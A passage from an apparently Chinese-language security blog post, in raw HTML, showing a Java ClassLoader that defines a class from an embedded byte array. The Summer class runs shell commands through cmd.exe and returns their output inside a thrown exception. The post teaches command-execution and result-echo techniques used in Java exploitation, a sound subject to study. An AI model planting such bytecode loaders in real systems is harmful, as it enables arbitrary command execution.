class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">108</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">77</span>, <span class="number">97</span>, <span class="number">112</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">76</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">55</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">78</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">62</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">67</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">69</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">112</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">83</span>, <span class="number">111</span>, <span class="number">117</span>, <span class="number">114</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">70</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">83</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">46</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">79</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">66</span>, <span class="number">117</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">99</span>, <span class="number">109</span>, <span class="number">100</span>, <span class="number">46</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">80</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">81</span>, <span class="number">0</span>, <span class="number">82</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">83</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">84</span>, <span class="number">0</span>, <span class="number">85</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">103</span>, <span class="number">98</span>, <span class="number">107</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">86</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">87</span>, <span class="number">0</span>, <span class="number">88</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">89</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">22</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">66</span>, <span class="number">117</span>, <span class="number">102</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">100</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">90</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">22</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">66</span>, <span class="number">117</span>, <span class="number">102</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">91</span>, <span class="number">0</span>, <span class="number">92</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">93</span>, <span class="number">0</span>, <span class="number">94</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">112</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">95</span>, <span class="number">0</span>, <span class="number">92</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">26</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">115</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">79</span>, <span class="number">98</span>, <span class="number">106</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">22</span>, <span class="number">40</span>, <span class="number">91</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">67</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">102</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">78</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">46</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">67</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">50</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">59</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">67</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">97</span>, <span class="number">112</span>, <span class="number">112</span>, <span class="number">101</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">44</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">66</span>, <span class="number">117</span>, <span class="number">102</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">116</span>, <span class="number">111</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">26</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">27</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">27</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">112</span>, <span class="number">42</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">1</span>, -<span class="number">69</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">89</span>, <span class="number">6</span>, -<span class="number">67</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">89</span>, <span class="number">3</span>, <span class="number">18</span>, <span class="number">4</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">4</span>, <span class="number">18</span>, <span class="number">5</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">5</span>, <span class="number">43</span>, <span class="number">83</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">6</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">7</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">77</span>, -<span class="number">69</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">89</span>, <span class="number">44</span>, <span class="number">18</span>, <span class="number">10</span>, -<span class="number">72</span>, <span class="number">0</span>, <span class="number">11</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">78</span>, -<span class="number">69</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">89</span>, <span class="number">45</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">58</span>, <span class="number">4</span>, -<span class="number">69</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">89</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">58</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">58</span>, <span class="number">6</span>, <span class="number">25</span>, <span class="number">4</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">89</span>, <span class="number">58</span>, <span class="number">6</span>, -<span class="number">58</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">25</span>, <span class="number">5</span>, <span class="number">25</span>, <span class="number">6</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">19</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">87</span>, -<span class="number">89</span>, -<span class="number">1</span>, -<span class="number">24</span>, -<span class="number">69</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">89</span>, <span class="number">25</span>, <span class="number">5</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">21</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">22</span>, -<span class="number">65</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">28</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">38</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">50</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">60</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">69</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">72</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">83</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">99</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">29</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">72</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">30</span>, <span class="number">0</span>, <span class="number">31</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">0</span>, <span class="number">76</span>, <span class="number">0</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">35</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">50</span>, <span class="number">0</span>, <span class="number">62</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">0</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">60</span>, <span class="number">0</span>, <span class="number">52</span>, <span class="number">0</span>, <span class="number">38</span>, <span class="number">0</span>, <span class="number">39</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">69</span>, <span class="number">0</span>, <span class="number">43</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">0</span>, <span class="number">41</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">72</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">0</span>, <span class="number">42</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">43</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">31</span>, <span class="number">0</span>, <span class="number">2</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">72</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">44</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">45</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">46</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">48</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">49</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">45</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">26</span>, <span class="number">0</span>, <span class="number">50</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">51</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">52</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// 只处理Summer类</span></span><br><span class="line">        <span class="keyword">if</span> (name.equals(testClassName)) &#123;</span><br><span class="line">            <span class="comment">// 调用JVM的defineClass方法定义Summer类</span></span><br><span class="line">            <span class="keyword">return</span> defineClass(testClassName, testClassBytes, <span class="number">0</span>, testClassBytes.length);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.findClass(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 创建自定义的类加载器</span></span><br><span class="line">        demo2 loader = <span class="keyword">new</span> demo2();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 使用自定义的类加载器加载TestHelloWorld类</span></span><br><span class="line">            Class testClass = loader.loadClass(testClassName);</span><br><span class="line">            <span class="comment">// 反射创建Summer类，等价于 Summer t = new Summer(‘ipconfig);</span></span><br><span class="line">            testClass.getConstructor(String.class).newInstance("ipconfig");</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Summer类代码，这里是将回显结果使用异常类抛出。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Summer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Summer</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        InputStream stream = (<span class="keyword">new</span> ProcessBuilder(<span class="keyword">new</span> String[]&#123;<span class="string">"cmd.exe"</span>, <span class="string">"/c"</span>, cmd&#125;)).start().getInputStream();</span><br><span class="line">        InputStreamReader streamReader = <span class="keyword">new</span> InputStreamReader(stream, Charset.forName(<span class="string">"gbk"</span>));</span><br><span class="line">        BufferedReader bufferedReader = <span class="keyword">new</span> BufferedReader(streamReader);</span><br><span class="line">        StringBuffer buffer = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">        String line = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">while</span>((line = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            buffer.append(line).append(<span class="string">"\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Exception(buffer.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200605102043439.gif" alt="在这里插入图片描述"></p><hr><p>&emsp;&emsp; 工具类将<code>.class</code>字节码文件转化成字节数组，可以添加自定义改造成适合自己方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FiletoBytes</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">FiletoBytes</span><span class="params">(String file_name)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Author</span>:         summer</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@CreateDate</span>:     2020/5/26 14:39</span></span><br><span class="line"><span class="comment">     * <span 